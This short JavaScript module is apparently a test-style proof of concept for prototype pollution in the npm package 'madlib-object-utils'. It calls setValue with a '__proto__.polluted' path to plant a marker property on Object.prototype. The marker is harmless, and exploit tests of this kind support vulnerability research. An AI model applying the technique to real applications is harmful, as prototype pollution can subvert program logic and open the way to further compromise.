function exploitFunction(payload) {
  const objectUtils = require("madlib-object-utils");
  objectUtils.setValue("__proto__.polluted", {}, "yes");
}

module.exports = { exploitFunction };